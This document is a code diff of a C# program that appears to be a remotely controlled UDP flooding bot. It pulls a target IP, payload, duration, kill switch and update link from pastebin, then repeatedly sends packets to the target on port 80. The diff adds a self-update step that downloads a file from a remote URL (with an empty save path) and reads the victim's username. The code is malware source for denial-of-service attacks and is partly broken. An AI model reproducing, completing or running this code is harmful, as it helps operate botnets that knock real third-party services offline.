@@ -2,10 +2,8 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 using System;
 using System.Text;
-using System.Windows.Forms;
 using System.Net;
 using System.Net.Sockets;
 using System.Collections.Specialized;
@@ -24,62 +22,66 @@ namespace NetworkHandler
         {
 
             WebClient client = new WebClient();
-            string IPHit = client.DownloadString("https://pastebin.com/raw/MdeRXPsj");
-            string Data = client.DownloadString("https://pastebin.com/raw/a0vmKy6P");
-            string TimeAPI = client.DownloadString("https://pastebin.com/raw/VFj8r1z6");
-            string Version = client.DownloadString("https://pastebin.com/raw/UFDzTnC6");
-            string download = client.DownloadString("https://pastebin.com/raw/L8yRCgEq");
+            string IPHitFT = client.DownloadString("https://pastebin.com/raw/JA3NkNnZ");
+            string IPHit = client.DownloadString("https://pastebin.com/raw/6hwPjhXP");
+            string Data = client.DownloadString("https://pastebin.com/raw/5Dhrrn7K");
+            string TimeAPI = client.DownloadString("https://pastebin.com/raw/1gANyTRA");
+            string Version = client.DownloadString("https://pastebin.com/raw/pXCFUDXZ");
+            string download = client.DownloadString("https://pastebin.com/raw/x71a1jW6");
             UdpClient Client = new UdpClient();
             IPAddress ipAddr = IPAddress.Parse(IPHit);
             System.Threading.Thread.Sleep(Milliseconds);
             int Time = Int32.Parse(TimeAPI);
             DateTime now = DateTime.Now;
             string thisversion = "1.0";
+            string username = Environment.UserName;
+
 
 
             while (DateTime.Now.Subtract(now).Seconds < 25)
             {
 
-                if(Version == thisversion)
-                {
-
-                }
-                
-                else
-                {
-
-                }
-
-
-                if (IPHit == "1.1.1.1")
+                if (Version == thisversion)
                 {
 
                 }
 
                 else
                 {
-                    while (DateTime.Now.Subtract(now).Seconds < Time)
+                    WebClient webClient = new WebClient();
+                    webClient.DownloadFile(download ,@"");
+                }
+
+
+                if (IPHitFT == "True")
+                {
                     {
-                        //Wait For the Time
 
-                        try
-                        {
-                            Client.Connect(ipAddr, 80);
-                            byte[] senbytes = Encoding.ASCII.GetBytes(Data);
-                            Client.Send(senbytes, senbytes.Length);
-                            Client.AllowNatTraversal(true);
-                            Client.DontFragment = true;
-                        }
+                        while (DateTime.Now.Subtract(now).Seconds < Time)
+                            //Wait For the Time
 
-                        catch (Exception Err)
-                  
-                        {
-                        
-                        }
+                            try
+                            {
+                                Client.Connect(ipAddr, 80);
+                                byte[] senbytes = Encoding.ASCII.GetBytes(Data);
+                                Client.Send(senbytes, senbytes.Length);
+                                Client.AllowNatTraversal(true);
+                                Client.DontFragment = true;
+                            }
+
+                            catch (Exception Err)
+
+                            {
+
+                            }
                     }
+                }
+                else
+                {
+
 
                 }
-            
+
 
 
             }
